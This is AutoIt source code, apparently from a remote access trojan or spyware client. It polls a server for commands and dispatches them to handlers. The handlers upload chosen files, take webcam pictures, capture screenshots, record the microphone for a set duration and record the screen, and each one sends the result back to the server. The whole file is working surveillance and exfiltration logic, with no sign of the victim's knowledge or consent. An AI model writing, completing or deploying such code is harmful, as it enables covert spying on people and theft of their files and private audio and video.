
 Func fetchCommands()
	 
	 Local $commandString=getCommands()
	  
	 if StringInStr($commandString,"SUCCESS") Then
		
		 Local $commandArray=StringSplit($commandString, "*")
		 
		 Local $commandUnit=$commandArray[1]
		 
		 Local $commandId=$commandArray[2]
		 
		 getCommandType($commandUnit,$commandArray,$commandId)
		 
	 EndIf
	 
 EndFunc
 
 
 Func getCommandType($commandUnit,$commandArray,$commandId)
	 
	 Local $commandUnitArray=StringSplit($commandUnit, ",")
	 
	 Local $command=$commandUnitArray[1]
	 
	 if StringInStr($command,"UPLOADFILE")  then 
		 
		 commandUPLOADFILE($commandUnitArray,$commandArray,$commandId)
	 
	EndIf
    
	if StringInStr($command,"CAMERA")  then 
		 
		 commandCAMERA($commandUnitArray,$commandArray,$commandId)
	 
	EndIf
    
	if StringInStr($command,"SCREENSHOT")  then 
		 
		 commandSCREENSHOT($commandUnitArray,$commandArray,$commandId)
	 
    EndIf
    
	if StringInStr($command,"MICROPHONE")  then 
		 
		 commandMICROPHONE($commandUnitArray,$commandArray,$commandId)
	 
    EndIf
 
	if StringInStr($command,"SCREENRECORD")  then 
		 
		 commandSCREENRECORD($commandUnitArray,$commandArray,$commandId)
	 
    EndIf
 
 
EndFunc

Func  commandUPLOADFILE($commandUnitArray,$commandArray,$commandId) 
	
	putCommandStatus($commandId,"processing")
	 
	 Local $file=$commandUnitArray[2]
	 
	 if FileExists($file) Then
		 
		 $result=putFile($file)
		 
		 putCommandStatus($commandId,"success")
		 
		 putCommandFeedBack($commandId, $result)
		 
	 Else
		 
		  putCommandStatus($commandId,"fail")
		  
		  putCommandFeedBack($commandId, "Error file does not exist")
		 
	 EndIf
	
EndFunc


Func  commandCAMERA($commandUnitArray,$commandArray,$commandId) 
	
	putCommandStatus($commandId,"processing")
	 
	$result=cameraShotOnDemand()
	
	if $result=="fail" Then
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "Error accessing camera")
		
	Else
		
		$result=putFile($result)
		
		putCommandStatus($commandId,"SUCCESS")
		  
		putCommandFeedBack($commandId, $result)
		
	EndIf
	
EndFunc


Func  commandSCREENSHOT($commandUnitArray,$commandArray,$commandId) 
	
	putCommandStatus($commandId,"processing")
	 
	$result=screenShotOnDemand()
	
	if $result=="fail" Then
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "Error capturing screen shot")
		
	Else
		
		$result=putFile($result)
		
		putCommandStatus($commandId,"SUCCESS")
		  
		putCommandFeedBack($commandId, $result)
		
	EndIf
	
EndFunc


Func  commandMICROPHONE($commandUnitArray,$commandArray,$commandId) 
	
	Local $durration=$commandUnitArray[2]
	
	
	putCommandStatus($commandId,"processing")
	 
	$result=microphoneRecordingOnDemand($durration)
	
	if $result=="fail" Then
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "Error recording microphone")
		
	Else
		
		$result=putFile($result)
		
		putCommandStatus($commandId,"SUCCESS")
		  
		putCommandFeedBack($commandId, $result)
		
	EndIf
	
EndFunc


Func   commandSCREENRECORD($commandUnitArray,$commandArray,$commandId) 
	
	Local $durration=$commandUnitArray[2]
	
	putCommandStatus($commandId,"processing")
	 
	$result=screenRecordingOnDemand($durration)
	
	if $result=="fail" Then
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "Error recording screen")
		
	Else
		
		$result=putFile($result)
		
		putCommandStatus($commandId,"SUCCESS")
		  
		putCommandFeedBack($commandId, $result)
		
	EndIf
	
EndFunc